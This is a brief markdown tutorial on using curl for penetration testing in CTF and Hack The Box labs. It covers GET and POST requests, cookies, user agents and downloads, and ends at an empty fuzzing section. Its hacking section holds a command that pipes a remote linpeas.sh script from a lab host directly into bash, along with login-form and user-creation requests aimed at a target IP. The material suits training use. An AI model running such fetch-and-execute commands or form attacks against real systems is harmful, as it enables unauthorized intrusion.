# Hacking With cURL
A list of examples and references of hacking with Bash and the Curl command.

## What the heck is cURL?
cURL is short for "Client URL" and is a computer software project providing a library (libcurl) and command-line tool (curl) first released in 1997. It is a free client-side URL transfer library that supports the following protocols:
`Cookies, DICT, FTP, FTPS, Gopher, HTTP/1, HTTP/2, HTTP POST, HTTP PUT, HTTP proxy tunneling, HTTPS, IMAP, Kerberos, LDAP, POP3, RTSP, SCP, and SMTP`
Although attack proxies like BurpSuitePro are very handy tools, cURL allows you to get a bit closer to the protocol level, leverage bash scripting and provides a bit more flexibility when you are working on a complex vulnerability.

## cURL GET parameters
HTTP GET variables can be set by adding them to the URL.
Here is a simple get request example:
```
Save curls output into a file
$ curl -o mygettext.html http://www.gnu.org/software/gettext/manual/gettext.html
```

## cURL POST parameters
HTTP POST variables can be set using the -d (--data) parameter.  
Here is a simple login test example:  
```
curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
```
## cURL COOKIEs
cURL has an entire cookie engine that can be used to store and load cookies passed to it from a server between sessions:
```
curl -b oldcookies.txt -c newcookies.txt http://10.10.10.10/login.php
```
You can also specify your own cookies using the -b parameter:
```
curl -b "PHPSESSID=vn0g4d94rs09rgpqga85r9bnia" http://10.10.10.10/home.php
```

## cURL User Agents
```
curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" http://10.10.10.10/login.php
```

## cURL Save the server response to a file
```
curl -o payload.sh http://10.10.10.10/payload.sh
```

## cURL download a file to the current folder
```
curl -O http://10.10.10.10/payload.zip
```

## cURL follow HTTP/1.1 302 Found redirects
```
curl -L http://10.10.10.10/profile.php
```

## cURL view verbose debugging information
```
curl -v http://10.10.10.10/profile.php
```

# Hacking with cURL
Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.

## Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:
```
curl -sSk "http://10.10.10.10/linpeas.sh" | bash
```

## Attacking a Login Form with cURL
```
curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
```

## Creating new users with cURL
```
curl --data "name=test&email=test@test.com&password=test" http://10.10.10.10/newuser.php
```

# Fuzzing Web Servers with cURL
Often we performing an assessment against a webserver, we will attempt to trigger error conditions which will provide some deeper insights into the underlying processes and software. cURL can be a powerful fuzzing tool for generating these edge case error messages.

## Fuzzing with URL length limits with cURL

```

```
